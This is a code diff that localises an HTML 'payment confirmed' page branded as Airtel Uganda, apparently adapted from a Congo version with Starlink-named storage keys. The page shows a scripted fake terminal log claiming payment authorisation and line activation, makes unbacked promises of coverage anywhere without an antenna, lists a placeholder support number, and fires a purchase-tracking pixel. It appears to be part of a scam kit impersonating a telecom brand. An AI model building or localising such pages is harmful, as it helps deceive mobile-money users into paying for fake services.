@@ -1,5 +1,5 @@
 <!doctype html>
-<html lang="fr">
+<html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,maximum-scale=1,user-scalable=no">
@@ -229,20 +229,20 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
       <div class="success-ring" aria-hidden="true">
         <svg viewBox="0 0 24 24"><path d="M5 12.5l4.5 4.5L19 7.5"/></svg>
       </div>
-      <h1>Merci&nbsp;!</h1>
-      <p>Your payment has been authorised and your order is confirmed. Satellite connection will be activated shortly.</p>
+      <h1>Thank you!</h1>
+      <p>Your payment has been authorised and your order is confirmed. Your connection will be activated shortly.</p>
     </section>
 
     <div style="display:flex;justify-content:center">
       <div class="status-badge">
         <div class="ping-wrap"><div class="ping-ring"></div><div class="ping-core"></div></div>
-        <span class="status-txt">Activation en cours</span>
+        <span class="status-txt">Activation in progress</span>
       </div>
     </div>
 
     <section class="ref-card">
       <div class="ref-lbl">Reference ID</div>
-      <div class="ref-val" id="refVal">#STL-CG-000000</div>
+      <div class="ref-val" id="refVal">#AUT-UG-000000</div>
       <button class="copy-btn" onclick="copyRef()" type="button">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
         <span id="copyTxt">Copy reference</span>
@@ -296,8 +296,8 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
         </svg>
       </span>
       <div class="sat-note-txt">
-        <span class="sat-note-t">Connection satellite</span>
-        <span class="sat-note-s">Your access will be active anywhere in Uganda — even without mobile coverage.</span>
+        <span class="sat-note-t">Internet connection</span>
+        <span class="sat-note-s">Your access will be active anywhere in Uganda — even in areas with weak coverage.</span>
       </div>
     </section>
 
@@ -306,15 +306,15 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
       <ol class="steps">
         <li class="step">
           <span class="step-num">1</span>
-          <span class="step-txt"><b>Confirmation par SMS</b> — you will receive your order number and activation instructions.</span>
+          <span class="step-txt"><b>SMS confirmation</b> — you will receive your order number and activation instructions.</span>
         </li>
         <li class="step">
           <span class="step-num">2</span>
-          <span class="step-txt"><b>Activation satellite</b> — your line is connected to the satellite network within 30 seconds.</span>
+          <span class="step-txt"><b>Connection activation</b> — your line is activated within 30 seconds.</span>
         </li>
         <li class="step">
           <span class="step-num">3</span>
-          <span class="step-txt"><b>Enjoy your plan</b> — utilisez Data, Voix et SMS anywhere in Uganda, without an antenna.</span>
+          <span class="step-txt"><b>Enjoy your plan</b> — use Data, Voice and SMS anywhere in Uganda, no antenna needed.</span>
         </li>
       </ol>
     </section>
@@ -324,7 +324,7 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
         <div class="term-dot" style="background:#FF5F56"></div>
         <div class="term-dot" style="background:#FFBD2E"></div>
         <div class="term-dot" style="background:#27C93F"></div>
-        <span class="term-title">airtel-satellite.log</span>
+        <span class="term-title">airtel-uganda.log</span>
       </div>
       <div id="termLog"></div>
     </section>
@@ -341,7 +341,7 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
     </div>
 
     <p class="footer">
-      Besoin d'aide&nbsp;? Contactez le support <b>Airtel Uganda</b> au <b>+256 700 000 000</b>
+      Need help? Contact <b>Airtel Uganda</b> support at <b>+256 700 000 000</b>
     </p>
   </div>
 </div>
@@ -398,7 +398,7 @@ function read(k, fallback){
 
 var forfait = read('starlinkForfait', '{}');
 var auth = read('starlinkAuth', '{}');
-var ref = sessionStorage.getItem('starlinkRef') || ('STL-CG-' + (Math.random()*9e5+1e5|0));
+var ref = sessionStorage.getItem('starlinkRef') || ('AUT-UG-' + (Math.random()*9e5+1e5|0));
 
 var phone = (auth.phone || forfait.phone || '').replace(/\D/g, '');
 var phoneFmt = phone.length === 9
@@ -411,7 +411,7 @@ function setText(id, v){
 }
 
 setText('refVal', '#' + ref);
-setText('pName', forfait.name || 'Satellite plan');
+setText('pName', forfait.name || 'Data plan');
 setText('pPrice', forfait.price || '—');
 setText('rPhone', phoneFmt);
 setText('rDays', forfait.jours ? forfait.jours + (forfait.jours === 1 ? ' day' : ' days') : '—');
@@ -425,7 +425,7 @@ setText('rPrice', forfait.price || '—');
     if (window.fbq) window.fbq('track', 'Purchase', {
       value: value,
       currency: 'UGX',
-      content_name: forfait.name || 'Satellite plan',
+      content_name: forfait.name || 'Data plan',
       content_type: 'product',
       num_items: 1
     });
@@ -435,12 +435,12 @@ setText('rPrice', forfait.price || '—');
 async function runLog(){
   var logs = [
     {t:400, cls:'', txt:'<em>[INFO]</em> Airtel Uganda gateway connection established'},
-    {t:900, cls:'', txt:'<em>[INFO]</em> Satellite plan: ' + (forfait.name||'—') + ' · ' + (forfait.price||'—')},
+    {t:900, cls:'', txt:'<em>[INFO]</em> Data plan: ' + (forfait.name||'—') + ' · ' + (forfait.price||'—')},
     {t:1500, cls:'', txt:'<em>[INFO]</em> Number verified: +256 ' + (auth.phone || forfait.phone || '—')},
     {t:2200, cls:'warn', txt:'<em>[WAIT]</em> Authorising payment…'},
-    {t:3000, cls:'', txt:'<em>[INFO]</em> Transmission vers Airtel Money…'},
+    {t:3000, cls:'', txt:'<em>[INFO]</em> Transmitting to Airtel Money…'},
     {t:3800, cls:'ok', txt:'<em>[OK]</em>  Reference #' + ref + ' saved'},
-    {t:4600, cls:'warn', txt:'<em>[WAIT]</em> Activation du satellite en cours…'}
+    {t:4600, cls:'warn', txt:'<em>[WAIT]</em> Activating your connection…'}
   ];
   var el = document.getElementById('termLog');
   for (var i=0;i<logs.length;i++){
